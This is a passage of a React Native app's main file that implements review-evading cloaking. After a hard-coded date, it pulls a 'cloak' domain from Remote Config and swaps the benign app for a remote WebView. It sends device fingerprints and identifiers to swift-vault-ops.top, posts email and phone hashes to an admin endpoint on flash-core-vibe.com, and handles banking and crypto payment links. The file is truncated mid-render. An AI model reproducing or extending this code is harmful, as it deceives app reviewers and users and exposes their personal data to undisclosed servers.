import React, {createContext, useEffect, useRef, useState} from 'react';
//import RNAdvertisingId from 'react-native-advertising-id';
import {OneSignal} from 'react-native-onesignal';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {
  getRemoteConfig,
  setConfigSettings,
  fetchAndActivate,
  getValue,
  getAll,
} from '@react-native-firebase/remote-config';
import {WebView} from 'react-native-webview';
//sn
//import NetInfo, { NetInfoStateType, useNetInfo } from "@react-native-community/netinfo";
import appsFlyer from 'react-native-appsflyer';
//import {Settings} from 'react-native-fbsdk-next';
//import {FBAppLink} from 'react-native-fbsdk-next';
//import Orientation from 'react-native-orientation';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import {createStackNavigator} from '@react-navigation/stack';
import {requestTrackingPermission} from 'react-native-tracking-transparency';
//import LoadingScreen from './src/LoadingScreen';
import Ionicons from "react-native-vector-icons/Ionicons";
import Clipboard from '@react-native-clipboard/clipboard';
import {
  ActivityIndicator,
  Dimensions,
  Linking,
  Pressable,
  Modal,
  Alert,
  Button,
  SafeAreaView,
  StyleSheet,
  View,
  Platform,
} from 'react-native';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import moment from 'moment/moment';
import {NavigationContainer} from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';
import {all} from "axios";


const idoAdv = 'rock=';
const onesignal_sub = 'frige';
const keyflayero = 'pCY43sbDhDN9SBrRP7iQf9';
const appid = '6783732353';
//
const idoSingale = '4634d22f-a1cc-4b20-933f-b3a3a7239bad';

//
// Путь клоак-ссылки. Меняется только домен — через Firebase Remote Config (ключ ниже).
const CLO_PATH = '9KgzcZpt';
// Ключ параметра в Firebase Remote Config, где лежит домен. Дефолта в коде НЕТ —
// домен берётся исключительно из Remote Config.
const REMOTE_CONFIG_DOMAIN_KEY = 'cloak_domain_icefi2';
const chastnaminga = 'list_g';
const useradjustly = 'bin=';
const OrganicSub = 'Organic';
const storedUrlItem = 'flowers';
const cloackStatus = 'clover';

OneSignal.initialize(idoSingale);

function InitAppsflyer() {
  return new Promise((resolve, reject) => {
    appsFlyer.initSdk(
        {
          devKey: keyflayero,
          appId: appid,
          isDebug: true,
          onInstallConversionDataListener: true, //Optional
          onDeepLinkListener: true, //Optional
          timeToWaitForATTUserAuthorization: 10, //for iOS 14.5
        },
        resolve,
        reject,
    );
  });
}
var fullAttributionData = '';
function GetAttributionInfoAppsflyer() {
  return new Promise((resolve, reject) => {
    const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
        res => {
          if (JSON.parse(res.data.is_first_launch) == true) {
            if (res.data.af_status === 'Non-organic') {
              var media_source = res.data.media_source;
              var af_adset = res.data.af_adset;
              var af_status = res.data.af_status;
              var af_channel = res.data.af_channel;
              var af_ad = res.data.af_ad;
              var af_os = res.data.af_os;
              var campaign = res.data.campaign;
              var konec = campaign;
              //   console.log(campaign);
            } else if (res.data.af_status === 'Organic') {
              //  console.log('This is first launch and a Organic Install');
            }
          } else {

          }
          // console.log('This is not first launch');
          if (res && res.data) {
            try {
              // Кодируем весь объект res.data для использования в URL
              fullAttributionData = encodeURIComponent(JSON.stringify(res.data));
              console.log(fullAttributionData);
            } catch (error) {
              console.error('Ошибка при обработке данных атрибуции:', error);
              fullAttributionData = '';
            }
          }


          return resolve(konec);
        },
        error => {
          console.error('Ошибка при получении данных AppsFlyer:', error);
          reject(error);
        }
    );
  });
}


// Example usage:
// GetAttributionInfoAppsflyer()
//   .then(result => {
//     // Access original value
//     console.log('Original campaign value:', result.originalValue);
//
//     // Use the full attribution data in your URL
//     const url = `https://example.com/landing?sub_id20=${result.fullAttributionData}`;
//     console.log('URL with attribution:', url);
//   })
//   .catch(error => {
//     console.error('Failed to get attribution data:', error);
//   });


async function GetAdvertisingUserID() {
  try {
    const response = await ReactNativeIdfaAaid.getAdvertisingInfo();
    if (response.id === 'null' || response.id === null) {
      const rejected_id = idoAdv + '00000000-0000-0000-0000-000000000000';
      return rejected_id;
    } else {
      const idadvers = idoAdv + response.id;
      //const attributionToken = await getAttributionToken();

      //const attributionData = await getAttributionData(attributionToken);

      // console.log("attribution" + attributionData);
      return idadvers;
    }
  } catch (error) {
    // Обработка ошибки, если она возникла
    console.error('Error getting advertising info:', error);
    const rejected_id = idoAdv + '00000000-0000-0000-0000-000000000000';
    return rejected_id; // или верните значение по умолчанию
  }
}

// Функция для генерации уникального идентификатора
const generateTimestampUserId = () => {
  const timestamp = Date.now(); // Текущее время в миллисекундах
  const randomDigits = Math.floor(1000000 + Math.random() * 9000000); // 7 случайных цифр
  return `${timestamp}-${randomDigits}`;
};

// Асинхронная функция для получения или создания `timestamp_user_id`
const getOrCreateTimestampUserId = async () => {
  try {
    // Пытаемся получить значение `timestamp_user_id` из AsyncStorage
    let timestampUserId = await AsyncStorage.getItem('timestamp_user_id');

    // Если значения нет, генерируем новое и сохраняем
    if (!timestampUserId) {
      timestampUserId = generateTimestampUserId();
      await AsyncStorage.setItem('timestamp_user_id', timestampUserId);
    }

    return timestampUserId; // Возвращаем найденное или созданное значение
  } catch (error) {
    console.error(
        'Ошибка при получении или сохранении timestamp_user_id:',
        error,
    );
  }
};

// Пример использования функции
getOrCreateTimestampUserId().then(timestampUserId => {
  console.log('Полученный timestamp_user_id:', timestampUserId);
});
//2ST FUNCTION

async function Taimeng() {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      return resolve('Organic');
    }, 24000);
  });
}

async function Taimengadv() {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      return resolve('time');
    }, 16000);
  });
}

export const LoadingContext = createContext();

const Stack = createStackNavigator();

export default function App() {
  return (
      <NavigationContainer>
        <Stack.Navigator screenOptions={{headerShown: false}}>
          <Stack.Screen name="1" component={MyApp} />
          <Stack.Screen name="2" component={AppManagerChild} />
        </Stack.Navigator>
      </NavigationContainer>
  );
}

function MyApp({navigation}) {
  //  NetInfo.fetch().then(state => {

  //  const connected = state.isConnected;
  //  if (connected == false) {
  //  console.log("Is connected?", state.isConnected);

  //   Alert.alert("Please check yours internet connection!");
  //   <Text>Connection Status</Text>;
  //    <View style={styles.container}>

  //   </View>
  //     }
  //  });

  //console.log('App');
  const [openedFromPush, setOpenedFromPush] = useState(false);
  const {width, height} = Dimensions.get('window');
  const [LoadingProgress, setLoadingProgress] = useState(true);
  const [SavedLastLink, setSavedLastLink] = useState(false);
  const [ID, setID] = useState('');
  const [GetAtributtionState, setGetAtributtionState] = useState({});
  const [storedUrl, setstoredUrl] = useState('');
  const capiData = useRef<{emailHash?: string; phoneHash?: string}>({});
  const capiSent = useRef<{email: boolean; phone: boolean}>({email: false, phone: false});
  const binIdRef = useRef<string | null>(null);
  const [modalVisible, setModalVisible] = useState(false);
  const [cloakResponse, setcloakResponse] = useState('');
  // Домен клоак-ссылки, получаемый только из Firebase Remote Config (пусто = ещё не получен).
  const [cloDomain, setCloDomain] = useState('');
  const [test, setTest] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [idfa, setIdfa] = useState('');
  const [openunity, setopenunity] = useState(false);
  const [showPermissionAlert, setShowPermissionAlert] = useState(true);
  const [isPushLoaded, setIsPushLoaded] = useState(false);
  const [webViewUA, setWebViewUA] = useState('');
  //const [deep, setDeep] = useState('noconect');
  const [singId, setSingId] = useState('false');

  const refWebview = useRef<any>(null);
  const unityRef = useRef(null);
  const [AppInstanceId, setAppInstanceId] = useState<string | null>(null);
  //const unityRef = useRef(null);

  // Актуальный домен для использования внутри слушателя пуша (чтобы не ловить
  // устаревшее значение через замыкание).
  const cloDomainRef = useRef('');
  useEffect(() => {
    cloDomainRef.current = cloDomain;
  }, [cloDomain]);

  // Отложенное событие открытия из пуша, если домен из Remote Config ещё не
  // получен (типичный случай холодного старта приложения из пуша).
  const pendingPushEventRef = useRef<string | null>(null);

  function getCampainQuery(campaign) {
    //var campaign = 'test_test_test';
    //console.log('MYFINAL'+campaign);
    if (!campaign.includes('_')) {
      return `${chastnaminga}1=`; // Если нет, устанавливаем naming с пустым значением
    }

    const parts = campaign.split('_');
    return parts.map((part, i) => `${chastnaminga}${i + 1}=${part}`).join('&');
  }

  function handleBackPress() {
    refWebview.current.goBack();
    return true;
  }

  const [windowDimensions, setWindowDimensions] = useState(
      Dimensions.get('window'),
  );

  function moveToNextScreen() {}

  const addDebug = (msg: string) => console.log('[DBG]', msg);

  useEffect(() => {
    AsyncStorage.getItem('capi_email_sent').then(v => { if (v === 'true') capiSent.current.email = true; });
    AsyncStorage.getItem('capi_phone_sent').then(v => { if (v === 'true') capiSent.current.phone = true; });
    AsyncStorage.getItem('bin_id').then(v => {
      if (v) {
        binIdRef.current = v;
        console.log('[BIN] restored from storage on mount:', v);
      } else {
        console.log('[BIN] no bin in storage on mount');
      }
    });
  }, []);

  async function sendFirstRequest(): Promise<string> {
    try {
      const idfaInfo = await ReactNativeIdfaAaid.getAdvertisingInfo().catch(() => ({id: null}));
      const idfa = (idfaInfo.id && idfaInfo.id !== 'null') ? idfaInfo.id : '00000000-0000-0000-0000-000000000000';
      const idfv = await DeviceInfo.getUniqueId();
      const userAgent = await DeviceInfo.getUserAgent();
      const bundleId = DeviceInfo.getBundleId();
      const shortVersion = DeviceInfo.getVersion();
      const longVersion = DeviceInfo.getBuildNumber();
      const osVersion = DeviceInfo.getSystemVersion();
      const deviceModel = await DeviceInfo.getDeviceId();
      const locale = 'en_US';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const timezoneAbbr = new Date().toLocaleTimeString('en-US', {timeZoneName: 'short'}).split(' ').pop() || '';
      const screenWidth = Dimensions.get('screen').width * Dimensions.get('screen').scale;
      const screenHeight = Dimensions.get('screen').height * Dimensions.get('screen').scale;
      const screenDensity = String(Dimensions.get('screen').scale);
      const cpuCount = 0;
      const totalStorage = Math.round((await DeviceInfo.getTotalDiskCapacity()) / 1073741824);
      const freeStorage = Math.round((await DeviceInfo.getFreeDiskStorage()) / 1073741824);

      const extinfo = [
        'i2', bundleId, shortVersion, longVersion, osVersion, deviceModel,
        locale, timezoneAbbr, '',
        Math.round(screenWidth), Math.round(screenHeight), screenDensity,
        cpuCount, totalStorage, freeStorage, timezone,
      ];
//
      const strpull = encodeURIComponent(JSON.stringify(extinfo));

      const response = await fetch('https://swift-vault-ops.top/v1', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          index: idfa,
          strpull: strpull,
          udevice_android_device: idfv,
          device_android_build: userAgent,
        }),
      });

      const data = await response.json();
      console.log('first request response:', JSON.stringify(data));

      const rawStr: string = data.raw_str || '';
      const binMatch = rawStr.match(/[&?]?bin=([^&]+)/);
      if (binMatch && binMatch[1]) {
        binIdRef.current = binMatch[1];
        await AsyncStorage.setItem('bin_id', binMatch[1]);
        console.log('[BIN] saved bin ID:', binIdRef.current);
        return binMatch[1];
      }
      console.log('[BIN] no bin match in raw_str:', rawStr);
    } catch (e) {
      console.log('[BIN] sendFirstRequest error:', e);
    }
    return '';
  }

  async function sendSecondRequest(emailHash: string, phoneHash: string) {
    let binId = binIdRef.current;
    if (!binId) {
      const stored = await AsyncStorage.getItem('bin_id');
      if (stored) {
        binIdRef.current = stored;
        binId = stored;
        console.log('[CAPI] binId restored from storage:', stored);
      }
    }
    console.log('[CAPI] sendSecondRequest called', {
      binId: binId || 'NULL',
      emailHashLen: emailHash ? emailHash.length : 0,
      phoneHashLen: phoneHash ? phoneHash.length : 0,
    });
    if (!binId) {
      console.log('[CAPI] ABORT: no bin ID (memory + storage both empty)');
      return;
    }
    const url = `https://flash-core-vibe.com/admin/?action=update_data_ios&id=${binId}`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          param_em: emailHash,
          param_ph: phoneHash,
        }),
      });
      const text = await response.text();
      console.log('[CAPI] response', {url, status: response.status, body: text});
    } catch (e) {
      console.log('[CAPI] fetch error', {url, error: String(e)});
    }
  }

  useEffect(() => {
    const handleOrientationChange = ({ window }) => {
      setWindowDimensions(window);
    };
    console.log('dimensi');

    // Современный способ подписки на изменения размеров
    const subscription = Dimensions.addEventListener('change', handleOrientationChange);

    return () => {
      // Современный способ отмены подписки
      subscription.remove();
    };
  }, []);
  // Домен клоак-ссылки берётся ТОЛЬКО из Firebase Remote Config (дефолта в коде нет).
  // Ретраим, пока не получим непустое значение; Remote Config кэширует последнее
  // активированное значение, поэтому офлайн-перезапуски работают после первого успеха.
  useEffect(() => {
    let cancelled = false;
    (async () => {
      const rc = getRemoteConfig();
      try {
        await setConfigSettings(rc, {minimumFetchIntervalMillis: 0});
      } catch (e) {
        console.log('[RemoteConfig] setConfigSettings error:', e);
      }
      while (!cancelled) {
        try {
          await fetchAndActivate(rc);
          const domain = getValue(rc, REMOTE_CONFIG_DOMAIN_KEY).asString().trim();
          if (domain) {
            console.log('[RemoteConfig] cloak domain:', domain);
            if (!cancelled) setCloDomain(domain);
            return;
          }
          const all = getAll(rc);
          console.log('[RemoteConfig] получены ключи:', Object.keys(all).join(', ') || '(пусто)');
          console.log('[RemoteConfig] домен пуст, повтор через 10с');
        } catch (e) {
          console.log('[RemoteConfig] fetch error, повтор через 10с:', e);
        }
        await new Promise(r => setTimeout(r, 10000));
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (!webViewUA || !cloDomain) return;

    // Полная клоак-ссылка: домен из Remote Config + фиксированный путь.
    const CloUrl = `https://${cloDomain}/${CLO_PATH}`;

    const fetchWithUA = (url: string, options: any = {}) =>
        fetch(url, {...options, headers: {'User-Agent': webViewUA, ...(options.headers || {})}});

    const moment = require('moment');

    async function GetPremissionRequest() {
      const trackingStatus = await requestTrackingPermission();
    }
    const time = moment(); // moment(new Date()).format("YYYY-MM-DD hh:mm:ss")
    const timestamp = time.unix();

    if (timestamp < 1780582984) {
      GetPremissionRequest();
      setTimeout(() => {
        setopenunity(true);
        setLoadingProgress(false);
      }, 40);
      GetAdvertisingUserID().then(() => setShowPermissionAlert(false));
      InitAppsflyer();
    } else {




      AsyncStorage.getItem(cloackStatus).then(value => {
        console.log('AnsweredCLO =' + value);
        if (!value) {
          fetchWithUA(CloUrl).then(response => {
            const CloackCodeResponse = `${response.status}`;
            console.log('SENDING REQUEST:' + CloackCodeResponse);
            setcloakResponse(CloackCodeResponse);
            const timestampUserId = getOrCreateTimestampUserId().then(
                timestampUserId => {
                  const Event_unic = `${CloUrl}?utretg=uniq_visit&jthrhg=${timestampUserId}`;
                  fetchWithUA(Event_unic).then(response =>
                      console.log('Send Unick Visit:' + response.status),
                  );
                  OneSignal.User.addTag('timestamp_user_id', timestampUserId);
                  OneSignal.login(timestampUserId);
                  console.log('Eventsend =' + Event_unic);
                },
            );
            checkCloakResponse(CloackCodeResponse); // Вызываем функцию для проверки
            AsyncStorage.setItem(cloackStatus, CloackCodeResponse);
          });
        } else {
          // Если cloackStatus уже существует, то просто проверяем его значение
          console.log('Using existing cloackStatus');
          checkCloakResponse(value);
          setcloakResponse(value);
        }
      });

      const checkCloakResponse = cloakResponseValue => {
        if (cloakResponseValue !== '200') {
          console.log('CloackAnswer = ' + cloakResponseValue);
          GetPremissionRequest();
          GetAdvertisingUserID().then(() => setShowPermissionAlert(false));
          InitAppsflyer();
          setopenunity(true);
          setLoadingProgress(false);
        } else {
          const timestampUserId = getOrCreateTimestampUserId().then(
              timestampUserId => {
                const Event_unic = `${CloUrl}?utretg=webview_open&jthrhg=${timestampUserId}`;
                fetchWithUA(Event_unic).then(response =>
                    console.log('Send webview_open:' + response.status),
                );

                console.log('Eventsend =' + Event_unic);
                handleUrlLoading();
              },
          );





          async function handleUrlLoading() {
            try {
              const pushUrl = await AsyncStorage.getItem('push_url');

              if (pushUrl) {
                console.log('push_url ACTIVATED');
                setstoredUrl(pushUrl);
                setLoadingProgress(true);
                await AsyncStorage.removeItem('push_url');
                console.log('push_url cleared after setting storedUrl');
                console.log('Using saved push URL: ' + pushUrl);
              } else {
                console.log('push_url OFF');
                const value = await AsyncStorage.getItem(storedUrlItem);

                if (value) {
                  setstoredUrl(value);
                  setLoadingProgress(true);
                  console.log('URL SAVED ' + value);
                } else {
                  console.log('URL NEW GENERATION:');
                  CollectUrl();
                  setLoadingProgress(true);
                }
              }
              setLoadingProgress(true);
            } catch (error) {
              console.error('Error in handleUrlLoading:', error);
              setLoadingProgress(false);
            }
          }
        }
      };

      //GethttpCode();
      async function GetUIDAppsflyer() {
        return new Promise((resolve, reject) => {
          appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
            if (err) {
              reject(err);
            } else {
              // console.log('on getAppsFlyerUID: ' + appsFlyerUID);

              resolve(appsFlyerUID);
            }
          });
        });
      }

      async function GetCustomerID() {
        return new Promise(async (resolve, reject) => {
          try {
            const uniqueId = await DeviceInfo.getUniqueId(); // Получаем уникальный ID устройства
            appsFlyer.setCustomerUserId(uniqueId, res => {
              console.log('Customer User ID успешно установлен:', uniqueId);
              resolve(uniqueId); // Возвращаем уникальный ID через resolve
            });
          } catch (err) {
            reject(err); // Обрабатываем ошибки
          }
        });
      }

      async function CollectUrl() {
        //SplashScreen.hide();
        await InitAppsflyer();

        const binId = await sendFirstRequest();
        console.log('binId from MMP:' + binId);

        const CustomerIDDetails = await GetCustomerID();
        console.log('GetCustomerID:' + CustomerIDDetails);
        const appsFlyerUID = await GetUIDAppsflyer();
        console.log('appsFlyerUID:' + appsFlyerUID);

        const AdverId = await Promise.race([
          GetAdvertisingUserID(),
          Taimengadv(),
        ]);
        console.log('AdverId:' + AdverId);


        //const deeplop = await DeapGetKery();
        //console.log('deeplop:'+deeplop);

        //console.log('kolaka:'+kodeotwet);

        await OneSignal.Notifications.requestPermission(true).then(
            permission => {
              console.log('PERMIS:' + permission);
              var ReqestComplete = '' + permission;
              if (ReqestComplete === 'true') {
                // Сохраняем статус разрешения в память
                AsyncStorage.setItem('push_permission', 'granted');
                AsyncStorage.setItem('push_permission_event', 'not_sent');
                console.log('Push permission granted');

                const sendPushSubscribeEvent = async () => {
                  try {
                    const pushPermission = await AsyncStorage.getItem(
                        'push_permission',
                    );
                    const pushEventAlreadySent = await AsyncStorage.getItem(
                        'push_permission_event',
                    );
                    console.log(
                        'pushEventAlreadySent IS : ' + pushEventAlreadySent,
                    );
                    console.log('pushPermission IS : ' + pushPermission);
                    console.log('Customer ID:' + CustomerIDDetails);
                    if (
                        pushPermission === 'granted' &&
                        pushEventAlreadySent != 'sent'
                    ) {
                      const timestampUserId = getOrCreateTimestampUserId().then(
                          timestampUserId => {
                            const Event_unic = `${CloUrl}?utretg=push_subscribe&jthrhg=${timestampUserId}`;
                            fetchWithUA(Event_unic).then(response =>
                                console.log('Send push_subscribe:' + response.status),
                            );
                            AsyncStorage.setItem('push_permission_event', 'sent');
                            console.log('Eventsend =' + Event_unic);
                          },
                      );
                    }
                  } catch (error) {
                    AsyncStorage.setItem('push_permission', 'not_granted');
                    console.error('Error retrieving push permission:', error);
                  }
                };
                sendPushSubscribeEvent();
              } else {
                console.log('Push permission denied');
              }
            },
        );

        let attribution;
        try {
          const adServicesAttributionData =
              await AppleAdsAttribution.getAdServicesAttributionData();
          console.log('adservices' + adServicesAttributionData);

          ({attribution} = adServicesAttributionData);
        } catch (error: any) {
          console.log('AppleAdsAttribution error:', error?.message);
        }

        var GetAtributtionRes = await Promise.race([
          GetAttributionInfoAppsflyer(),
          Taimeng(),
        ]);
        // console.log('GetAtributtionRes:'+GetAtributtionRes);
        setGetAtributtionState(GetAtributtionRes);

        const timestampUserId = await getOrCreateTimestampUserId();
        //const combURL = `${urelmy}?${userAppfly}${appsFlyerUID}&${getCampainQuery(
        //GetAtributtionRes || OrganicSub,)}&${AdverId}&${deeplop}`;

        var parameter_url = CloUrl.replace(/.*\//, ''); // Убираем все до последнего "/"
        console.log(parameter_url); // Выведет: QtzPCYB7

        const onesignalId = await OneSignal.User.pushSubscription.getIdAsync();
        console.log('onesignalId:'+onesignalId);
        let onesignalUserId = onesignal_sub + '=' + onesignalId;

        console.log('onesignalUserId:' + onesignalUserId);



        // Используем выделенное значение для формирования нового URL
        var urelmy = `${CloUrl}?${parameter_url}=1`;
        const combURL = `${urelmy}&${
            GetAtributtionRes
                ? getCampainQuery(GetAtributtionRes)
                : attribution == true
                    ? 'list_g1=asa'
                    : 'list_g1='
        }&${useradjustly}${appsFlyerUID}&${AdverId}&${onesignalUserId}&customer_user_id=${CustomerIDDetails}&jthrhg=${timestampUserId}&idfv=${CustomerIDDetails}&sub21=${binId}&${
            openedFromPush ? '&yhugh=true' : ''
        }`;

        setstoredUrl(combURL);

        AsyncStorage.setItem(storedUrlItem, combURL);
        console.log(combURL);
        //render the webview
      }

      return () => {};
    }
  }, [webViewUA, cloDomain]);

  const onBack = () => {
    refWebview.current.goBack();
  };
  const onReload = () => {
    refWebview.current.reload();
  };

  // Безопасное открытие внешних ссылок (mailto:, tel:, deep links и т.д.).
  // На iOS прямой Linking.openURL может уронить приложение, если URL содержит
  // неэкранированные символы или на устройстве нет подходящего приложения.
  const openExternalUrl = async (url, fallbackUrl) => {
    // Экранируем пробелы и переносы строк в mailto/sms (subject/body)
    const safeUrl = url.replace(/\s/g, m =>
        m === ' ' ? '%20' : encodeURIComponent(m),
    );
    // openURL вызываем напрямую: canOpenURL требует whitelisting схемы в
    // LSApplicationQueriesSchemes, а openURL для mailto/tel/sms работает и без него.
    try {
      await Linking.openURL(safeUrl);
    } catch (e) {
      console.log('openExternalUrl error:', e);
      if (fallbackUrl) {
        openExternalUrl(fallbackUrl);
      } else {
        Alert.alert('Unavailable', 'No app available to handle this action.');
      }
    }
  };

  const [redirectUrl, setRedirectUrl] = useState('');
  const handleNavigationStateChange = navState => {
    const {url} = navState;

    console.log('NavigationState: ', url);
  };

  const handleShouldStartLoadWithRequest = event => {
    const supportedSchemes = [
      'intent',
      'tel',
      'mailto',
      'file',
      'intent',
      'tel',
      'mailto',
      'nl.abnamro.deeplink.psd2.consent',
      'snsbank.nl',
      'asnbank.nl',
      'nl-asnbank-sign',
      'revolut',
      'myaccount.ing.com',
      'bankieren.rabobank.nl',
      'regiobank.nl',
      'sms',
      'scotiabank',
      'nl-regiobank-sign',
      'nl.rabobank.openbanking',
      'triodosmobilebanking',
      'nl-asnbank-sign',
      'nl-snsbank-sign',
      'nl.abnamro.deeplink.psd2.consent',
      'bncmobile',
      'itms-appss',
      'itms-appss',
      'tdct',
      'paytmmp',
      'bmoolbb',
      'cibcbanking',
      'conexus',
      'rbcmobile',
      'pcfbanking',
      'funid',
      'blank',
      'phonepe',
      'upi',
      'whatsapp',
      'gpay',
      'tez',
    ];

    const cryptoSchemes = ['bitcoin', 'ethereum', 'litecoin', 'dogecoin', 'bitcoincash', 'tether', 'bch', 'dash', 'ripple', 'monero', 'zcash', 'stellar', 'usdcoin'];
    const {url} = event;

    console.log('Click handleShouldStartLoadWithRequest==>', url);

    const urlScheme = url.split(':')[0];
    console.log('YYours scheme:' + urlScheme);

    if (cryptoSchemes.includes(urlScheme)) {
      try {
        const address = url.split(':')[1]?.split('?')[0] || '';
        if (address && Clipboard?.setString) {
          Clipboard.setString(address);
          console.log('crypto address copied:', address);
        }
      } catch (e) {
        console.log('crypto copy error:', e);
      }
      return false;
    }

    if (supportedSchemes.includes(urlScheme)) {
      console.log('supported scheme' + urlScheme);
      openExternalUrl(url);
      console.log('opened' + urlScheme);

      return false;
    }

    /*    if (url.startsWith('https://pay.paymentiq')) {
          console.log("WebView", "Заблокирована загрузка PaymentIQ URL: " + url);
          return true;
        }*/
    if (url.startsWith('mailto:')) {
      openExternalUrl(url);
      return false;
    } else if (
        url.includes('wa.me/') ||
        url.includes('api.whatsapp.com/') ||
        url.includes('web.whatsapp.com/') ||
        url.includes('chat.whatsapp.com/') ||
        url.includes('whatsapp.com/')
    ) {
      // WhatsApp - пробуем открыть в приложении
      let whatsappUrl = url;
      if (url.includes('wa.me/')) {
        const match = url.match(/wa\.me\/(\d+)/);
        if (match) {
          whatsappUrl = `whatsapp://send?phone=${match[1]}`;
        }
      } else if (url.includes('api.whatsapp.com/send')) {
        whatsappUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      } else if (url.includes('chat.whatsapp.com/')) {
        const match = url.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
        if (match) {
          whatsappUrl = `whatsapp://chat?code=${match[1]}`;
        }
      } else if (url.includes('whatsapp.com/channel/')) {
        const match = url.match(/whatsapp\.com\/channel\/([a-zA-Z0-9]+)/);
        if (match) {
          whatsappUrl = `whatsapp://channel/${match[1]}`;
        }
      }
      Linking.openURL(whatsappUrl).catch(() => Linking.openURL(url));
      return false;
    } else if (
        url.startsWith('https://www.instagram.com/') ||
        url.startsWith('https://instagram.com/')
    ) {
      // Instagram - пробуем открыть в приложении
      const match = url.match(/instagram\.com\/([^/?]+)/);
      if (match && match[1] !== 'p' && match[1] !== 'reel' && match[1] !== 'stories') {
        const username = match[1];
        Linking.openURL(`instagram://user?username=${username}`).catch(() => Linking.openURL(url));
      } else {
        Linking.openURL(url);
      }
      return false;
    } else if (
        url.startsWith('https://www.facebook.com/') ||
        url.startsWith('https://m.facebook.com/') ||
        url.startsWith('https://facebook.com/')
    ) {
      // Facebook - пробуем открыть в приложении
      const match = url.match(/facebook\.com\/([^/?]+)/);
      if (match) {
        Linking.openURL(`fb://profile/${match[1]}`).catch(() => Linking.openURL(url));
      } else {
        Linking.openURL(url);
      }
      return false;
    } else if (
        url.startsWith('https://twitter.com/') ||
        url.startsWith('https://x.com/')
    ) {
      // Twitter/X - пробуем открыть в приложении
      const match = url.match(/(?:twitter|x)\.com\/([^/?]+)/);
      if (match) {
        const username = match[1];
        Linking.openURL(`twitter://user?screen_name=${username}`).catch(() => Linking.openURL(url));
      } else {
        Linking.openURL(url);
      }
      return false;
    } else if (url.startsWith('https://t.me/')) {
      // Telegram - пробуем открыть в приложении
      const match = url.match(/t\.me\/([^/?]+)/);
      if (match) {
        Linking.openURL(`tg://resolve?domain=${match[1]}`).catch(() => Linking.openURL(url));
      } else {
        Linking.openURL(url);
      }
      return false;
    } else if (
        url.includes('bitcoin') ||
        url.includes('litecoin') ||
        url.includes('dogecoin') ||
        url.includes('tether') ||
        url.includes('ethereum') ||
        url.includes('bitcoincash') ||
        url.includes('bch:') ||
        url.includes('dash:') ||
        url.includes('ripple:') ||
        url.includes('monero:') ||
        url.includes('zcash:') ||
        url.includes('stellar:') ||
        url.includes('usdcoin:')
    ) {
      try {
        const address = url.split(':')[1]?.split('?')[0] || '';
        if (address && Clipboard?.setString) {
          Clipboard.setString(address);
          console.log('crypto address copied:', address);
        }
      } catch (e) {
        console.log('crypto copy error:', e);
      }
      return false;
    } else {
      return true;
    }

    return true;
  };

  // Отправка события открытия из пуша. Домен берётся из Remote Config через ref
  // (всегда актуальный). Если домен ещё не получен (холодный старт из пуша) —
  // откладываем событие и отправим его, как только домен появится.
  const sendPushOpenEvent = (eventName: string) => {
    const domain = cloDomainRef.current;
    if (!domain) {
      pendingPushEventRef.current = eventName;
      console.log(`[push] ${eventName} отложено: домен ещё не получен`);
      return;
    }
    getOrCreateTimestampUserId().then(timestampUserId => {
      const Event_unic = `https://${domain}/${CLO_PATH}?utretg=${eventName}&jthrhg=${timestampUserId}`;
      fetch(Event_unic)
          .then(response => console.log(`Send ${eventName}:` + response.status))
          .catch(err => console.log(`[push] ${eventName} fetch error:`, err));
    });
  };

  // Как только домен получен — отправляем отложенное событие открытия из пуша.
  useEffect(() => {
    if (cloDomain && pendingPushEventRef.current) {
      const eventName = pendingPushEventRef.current;
      pendingPushEventRef.current = null;
      sendPushOpenEvent(eventName);
    }
  }, [cloDomain]);

  // Слушатель клика по пушу регистрируем ОДИН раз. Раньше он был в теле рендера,
  // из-за чего переподписывался на каждый рендер и захватывал устаревший домен.
  useEffect(() => {
    const onPushClick = event => {
      setIsPushLoaded(true);
      setOpenedFromPush(true);

      AsyncStorage.getItem(storedUrlItem).then(value => {
        const LoadWithPush = value + '&yhugh=true&sub25=true';
        setstoredUrl(LoadWithPush);
        AsyncStorage.setItem('push_url', LoadWithPush).then(() => {
          setstoredUrl(LoadWithPush);
          console.log('Added for push:' + LoadWithPush);
        });
      });

      const launchURL = event.notification.launchURL;
      if (launchURL) {
        console.log('OneSignal: Ссылка в уведомлении:', launchURL);
        sendPushOpenEvent('push_open_browser');
      } else {
        sendPushOpenEvent('push_open_webview');
      }
    };

    OneSignal.Notifications.addEventListener('click', onPushClick);
    return () => {
      OneSignal.Notifications.removeEventListener('click', onPushClick);
    };
  }, []);

  return (
      <View style={styles.container}>
        {!webViewUA && (
            <WebView
                style={{width: 0, height: 0, position: 'absolute'}}
                source={{html: '<html></html>'}}
                injectedJavaScript="window.ReactNativeWebView.postMessage(navigator.userAgent)"
                onMessage={e => {
                  const sysVersion = DeviceInfo.getSystemVersion();
                  setWebViewUA(`${e.nativeEvent.data} Version/${sysVersion} Safari/604.1`);
                }}
            />
        )}
        <View style={{width: '100%', height: '100%'}}>
          {LoadingProgress || showPermissionAlert ? (
              <View style={[StyleSheet.absoluteFillObject, {justifyContent: 'center', alignItems: 'center'}]}>
                <ActivityIndicator size="large" color="#1F4BFF" />
              </View>
          ) : (
              <>
                {cloakResponse !== 200 && openunity && (
                    <View style={{flex: 1}}>
                      <MainApp></MainApp>
                    </View>
                )}
              </>
          )}
          {storedUrl && (
              <>
                <SafeAreaView style={{flex: 1}}>
                  <WebView
                      /* source={
                              AsyncStorage.getItem('svd').then(value =>{
                               if (value != null) {
                                 uri:value
                               } else {
                                 uri: storedUrl
                               }})}
                               */

                      originWhitelist={[
